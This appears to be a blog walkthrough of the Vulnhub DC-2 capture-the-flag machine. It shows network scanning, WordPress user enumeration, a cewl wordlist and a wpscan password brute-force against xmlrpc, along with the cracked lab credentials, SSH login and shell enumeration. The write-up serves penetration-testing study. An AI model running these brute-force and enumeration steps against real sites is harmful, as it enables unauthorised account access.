---
title: DC2 walkthrough/learning notes..
date: 2020-10-08 +0800
categories: [pentest-learning,Vulnhub]
tags: ctf 
---

now have no more useless words.

we got a new machine to HACK now.

after two machine config well(one is my kali, one is DC2, they connect with NAT in VMPro16)

# SCAN and DISCOVERY

## discovery

we use  the command in my frist article.
```bash
$ sudo arp-scan -l     
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:e8:bc:74, IPv4: 192.168.242.128
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.242.1   00:50:56:c0:00:08       VMware, Inc.
192.168.242.2   00:50:56:e9:c6:da       VMware, Inc.
192.168.242.131 00:0c:29:c6:c1:a4       VMware, Inc.
192.168.242.254 00:50:56:fc:49:5c       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 1.960 seconds (130.61 hosts/sec). 4 responded
```
explains it,my ip is 192.168.242.128

then the target ip is 192.168.242.131

>tips
>so why i can sure of that?why the ip is must be it?
>
>one way we can scan all of them
>
>next way is go on google ask why.now for the [article](https://zhuanlan.zhihu.com/p/130984945)


## scan

then we nmap it. after a liitle bit wait we got.
```bash
$ nmap -A 192.168.242.131    
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 06:24 EDT
Nmap scan report for 192.168.242.131
Host is up (0.00100s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Did not follow redirect to http://dc-2/
|_https-redirect: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds
``` 
OH,we got problem.

the nmap and our machine or our DNS server can't know who is DC-2

nmap says:http-title: Did not follow redirect to http://dc-2/

so we should get a little bit help for it.

we can...do like this
```bash
sudo vim /etc/hosts
```
amd we need add one line
```
192.168.242.131	dc-2
```
save it we need...

press <ESC> and  input 

:wq

then we nmap again

>tips:
>
>Time is the biggest enemy of thieves
>
>also we need save it
>
>if scanning got very long time in real env.
>
>we can both turn up our web broswer

```bash
$ nmap -A 192.168.242.131
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 06:31 EDT
Nmap scan report for dc-2 (192.168.242.131)
Host is up (0.00014s latency)
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.38 seconds
```


we can got many informations about it.

1 is word press sites.

2 is it got no service as ssh and other.

---

>tips: recommend a new scanner in linux machine 
>special to debian/kali
>
>it`s the rustscan
>
>[github.com/Rustscan/Rustscan](https://github.com/RustScan/RustScan)
>
>
>if we use this tools to scan the box we will get faster and more detail.
>

```bash
$ rustscan 192.168.242.131 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.242.131:80
Open 192.168.242.131:7744
[~] Starting Nmap
[>] The Nmap command to be run is nmap -A -vvv -p 80,7744 192.168.242.131

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 12:05 EDT
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Initiating Ping Scan at 12:05
Scanning 192.168.242.131 [2 ports]
Completed Ping Scan at 12:05, 0.00s elapsed (1 total hosts)
Initiating Connect Scan at 12:05
Scanning dc-2 (192.168.242.131) [2 ports]
Discovered open port 80/tcp on 192.168.242.131
Discovered open port 7744/tcp on 192.168.242.131
Completed Connect Scan at 12:05, 0.00s elapsed (2 total ports)
Initiating Service scan at 12:05
Scanning 2 services on dc-2 (192.168.242.131)
Completed Service scan at 12:05, 6.03s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.242.131.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.95s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.06s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
Nmap scan report for dc-2 (192.168.242.131)
Host is up, received syn-ack (0.00030s latency).
Scanned at 2020-10-08 12:05:52 EDT for 7s

PORT     STATE SERVICE REASON  VERSION
80/tcp   open  http    syn-ack Apache httpd 2.4.10 ((Debian))
|_http-generator: WordPress 4.7.10
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: DC-2 &#8211; Just another WordPress site
|_https-redirect: ERROR: Script execution failed (use -d to debug)
7744/tcp open  ssh     syn-ack OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAMT3xv0ReIK733JHqB5o5t1Knur7MHfTeYoqdn2fxpfdk79iDYAD46e/C1hLs6R0CH1fSWfpJ0x45g77ZaEn/nOaR2UXiod20R6kyrAPyL4UELizECoJ9MdHSULedr0+4QcXhtUZ+4b76umJhENpOhH+vZjrjMI5uZo+EMjlylxFAAAAFQDzg8StOWpV7J5ZjSfIdcddFgqB/QAAAIA84WMMKmOEkvzgQZLuW5lTTecIrk+UXJyWVZSZFxvFbnt5mUvEzPBMqPZIo1h1dkzpEp1Xpk9Vb16LMrQcS6LgH8yhlo5402lUCfP6onxVNvGvP5uhLoQVjzPd65ZKJ7J1VSoz9xOmPkWr2HFuCf6XOBXy8WCxqZxWYTYERTuexgAAAIAI8DjfDmIjv0jUBAPZu0crpPoxvK4ZvdEy6UbfjK+pZYzkd6qnVLdWrvP9evbWaA5VoDZjWp1301VjX8Y1pqHFVaRUu3OBY7DgidJXA3zLd1BSdPzYfRJSZ1/xN75Yo13wW6XIEsy1kvUNOwA0Nm6zmcQ+SN/aBITwGOIBGrp06w==
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC92AIbO8wDuOXLMCrnJkTKDLxXzpwFY0EI4urz6cZpmOjGOZYbWz6Ele1sM3WXEWmOWkszLrMbVEFmuYan545oIHnylYX6ZY+eMPjJBRH/VDukRsNtAA8VRsvIkfCtcG5J9zAQTQDYYprEJljKPYavf4bIW3NZb0v57O01tGylLh23ZSfGpTmQXx+GsWet9vnbCr1+bzf/QeZ7PNK9BeBsLJsvWgLQmuaTdBYeW1b415xOaszWrutHQoaBdud/SPX1Uvy2PNFUfKIPjdbmAdRxTAvRHHaMTRdrvEhdJWz3wmefXr9e3S3YEu05USTqhMwi6OBxeqkjc+6mdR/PYR9
|   256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE329BkKjKxz7Y23cZSshQ76Ge3DFsJsTO89pgaInzX6w5G3h6hU3xDVMD8G8BsW3V0CwXWt1fTnT3bUc+JhdcE=
|   256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGyWHwWC3fLufEnM1R2zsvjMZ1TovPCp3mky/2s+wXTH
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:05
Completed NSE at 12:05 , 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/

Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

>look more faster and detail.

---
---

so now we can go to thos site and  run wpscan  together.

in the broswer we got the frist flag....also emmmm,it's a hint.
```
Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```

seems we need the useful password dictinary generator---CEWL

but the must do is need to do.WPscan

```bash
$ wpscan --url http://dc-2/                     
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]N
[+] URL: http://dc-2/ [192.168.242.131]
[+] Started: Thu Oct  8 06:45:17 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=====> (21 / 21) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct  8 06:45:20 2020
[+] Requests Done: 51
[+] Cached Requests: 5
[+] Data Sent: 10.22 KB
[+] Data Received: 287.697 KB
[+] Memory used: 206.758 MB
[+] Elapsed time: 00:00:02

```

O~K~,seems we got nothing more.

1 no vulnerable plugins but theme seems is out-of-data.

2 xmlrpc.php is on.the brute force is enable.

3 no config backup leaks out.

4 the wp version is low..but actually just because the machine is old.

# hint:user,password bruteforce.

ok now clear  our mind, sqy what we should do next.

we need get user information and then according their name to create the password wordlists.

and seems their are many users in it.

## get username 

wordpress give us the function to fuzz out the users.and it`s very fast.

we should say the magic words of it.

```
$ wpscan --url http://dc-2/ -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://dc-2/ [192.168.242.131]
[+] Started: Thu Oct  8 06:58:04 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct  8 06:58:06 2020
[+] Requests Done: 56
[+] Cached Requests: 6
[+] Data Sent: 12.641 KB
[+] Data Received: 514.536 KB
[+] Memory used: 132.699 MB
[+] Elapsed time: 00:00:02
```
ok three users:admin,jerry,tom.

that will help us a lot.maybe we need see the article for more information?

bad idea..because i use the google translation..the result of auto-detcet is latin......for a bad language leaner i think that is not a good idea.

## get password

ok now according to the hint:TO BE CEWL

i find the google of its usage and also man it.

```
$ cewl http://dc-2/ -w wordlist.txt -d 10 --with-numbers  
```

than it create an dictinary of this website.

seems very short?

may be it works.

so i run this command.the -P means use wordlist to bruteforce.
```bash
wpscan --url http://dc-2/ -e u -P  wordlist.txt 
```
the result is
```
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.7
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N][+] URL: http://dc-2/ [192.168.242.131]
[+] Started: Thu Oct  8 09:22:22 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://dc-2/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://dc-2/index.php/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>
 |  - http://dc-2/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.10</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://dc-2/wp-content/themes/twentyseventeen/
 | Last Updated: 2020-08-11T00:00:00.000Z
 | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 2.4
 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <====> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] jerry
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] tom
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Xmlrpc against 3 user/s
[SUCCESS] - jerry / adipiscing                                                    
[SUCCESS] - tom / parturient                                                      
Trying admin / log Time: 00:00:29 <======     > (646 / 1121) 57.62%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Oct  8 09:22:54 2020
[+] Requests Done: 663
[+] Cached Requests: 47
[+] Data Sent: 310.522 KB
[+] Data Received: 408.565 KB
[+] Memory used: 150.766 MB
[+] Elapsed time: 00:00:31
```
if you coomand line is color high light as my kali.

you will see the color red highlighting the username and password.

they are
```
[!] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
 | Username: tom, Password: parturient
```
success........

# access

after login two accont in http://dc-2/wp-login.php

we can know the jerry mouse have higher level privillege.

and we see....
```
Flag 2:

If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```
ok it seems not  more ways?right?

emmm...so the question is become how we can exp one wordpress website with the console access?

and even it got the shortcut on it,right?

maybe we need more information?

# get shell

i think i know how to login it..

do you remember our rustscan give us a result of ssh?

do you remember our wordpress user and account and pass??

when i have no idea about how to exp wp.

i try the ssh login.

the command  i use is 
```
ssh -p 7744 jerry@192.168.242.131
jerry@192.168.242.131's password: adipiscing
Permission denied, please try again.

```

seems the mouse is very clever right?

he didn`t give us chance to access the ssh,right?

the tom didn`t do as the same.

```
$ ssh -p 7744  tom@192.168.242.131
tom@192.168.242.131's password: parturient

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tom@DC-2:~$ ls
flag3.txt  usr
```

but we still got the problem,the cat head tail command are all banned.

but echo is not

so we can do as
``` bash
tom@DC-2:~$ for line in $(<flag3.txt); do echo $line; done
Poor
old
Tom
is
always
running
after
Jerry.
Perhaps
he
should
su
for
all
the
stress
he
causes.
```

## collect more info

do you remember the command in my frist [article](https://esonhugh.github.io/posts/DC1-walkthrough-learnning-notes/#level-up-your-permission) and it tips?

``` bash
tom@DC-2:~$ compgen -u
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-timesync
systemd-network
systemd-resolve
systemd-bus-proxy
Debian-exim
messagebus
statd
sshd
mysql
tom
jerry
```
---
```bash
tom@DC-2:~$ compgen -c
if
then
else
elif
fi
case
esac
for
select
while
until
do
done
in
function
time
{
}
!
[[
]]
coproc
__expand_tilde_by_ref
__get_cword_at_cursor_by_ref
__git_eread
__git_ps1
__git_ps1_colorize_gitstring
__git_ps1_show_upstream
__grub_dir
__grub_get_last_option
__grub_get_options_from_help
__grub_get_options_from_usage
__grub_list_menuentries
__grub_list_modules
__grubcomp
__ltrim_colon_completions
__parse_options
__reassemble_comp_words_by_ref
_a2disconf
_a2dismod
_a2dissite
_a2enconf
_a2enmod
_a2ensite
_allowed_groups
_allowed_users
_apache2_allcomp
_apache2_conf
_apache2_mods
_apache2_sites
_available_interfaces
_cd
_cd_devices
_command
_command_offset
_complete_as_root
_completion_loader
_configured_interfaces
_count_args
_debconf_show
_dvd_devices
_expand
_filedir
_filedir_xspec
_fstypes
_get_comp_words_by_ref
_get_cword
_get_first_arg
_get_pword
_gids
_grub_editenv
_grub_install
_grub_mkconfig
_grub_mkfont
_grub_mkimage
_grub_mkpasswd_pbkdf2
_grub_mkrescue
_grub_probe
_grub_script_check
_grub_set_entry
_grub_setup
_have
_init_completion
_insserv
_installed_modules
_ip_addresses
_kernel_versions
_known_hosts
_known_hosts_real
_longopt
_mac_addresses
_minimal
_modules
_ncpus
_parse_help
_parse_usage
_pci_ids
_pgids
_pids
_pnames
_pygmentize
_quote_readline_by_ref
_realcommand
_rl_enabled
_root_command
_service
_services
_shells
_signals
_split_longopt
_sysvdirs
_terms
_tilde
_uids
_update_initramfs
_upvar
_upvars
_usb_ids
_user_at_host
_usergroup
_userland
_variables
_xfunc
_xinetd_services
dequote
quote
quote_readline
.
:
[
alias
bg
bind
break
builtin
caller
cd
command
compgen
complete
compopt
continue
declare
dirs
disown
echo
enable
eval
exec
exit
export
false
fc
fg
getopts
hash
help
history
jobs
kill
let
local
logout
mapfile
popd
printf
pushd
pwd
read
readarray
readonly
return
set
shift
shopt
source
suspend
test
times
trap
true
type
typeset
ulimit
umask
unalias
unset
wait
less
scp
ls
vi
```
what a little poor Tom as the flag says.




